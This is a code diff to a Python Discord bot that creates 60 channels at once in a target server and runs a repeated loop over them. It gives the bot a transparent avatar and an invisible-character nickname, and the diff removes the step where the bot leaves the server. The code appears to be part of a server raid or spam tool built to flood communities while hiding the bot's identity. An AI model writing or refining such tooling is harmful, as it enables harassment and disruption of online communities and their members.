@@ -59,6 +59,7 @@ class DiscordBot(commands.Bot):
         try:
             await asyncio.gather(*(self.createChannel(channelName, guild) for _ in range(60)))
             self.channels = list(guild.channels)
+            random.shuffle(self.channels)
             for _ in range(numberOfExecutions):
                 if self.logId in stops:
                     logs.pop(self.logId)
@@ -71,7 +72,6 @@ class DiscordBot(commands.Bot):
             logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
         logs[self.logId] += "---- End ----\n"
         stops.append(self.logId)
-        await guild.leave()
         await self.close()
     async def on_ready(self):
         logs[self.logId] += f"ID:{self.user.id}, Name:{self.user.name}\n\n"
@@ -80,7 +80,7 @@ class DiscordBot(commands.Bot):
             logs[self.logId] += f"Error: The server you entered has not been joined by a bot."
             await self.close()
             return
-        with open('../assets/transparentAvatar.png', 'rb') as avatar:
+        with open('assets/transparentAvatar.png', 'rb') as avatar:
             await self.user.edit(avatar=avatar.read())
         i = self.guild.get_member(self.user.id)
         await i.edit(nick="឵᠎")
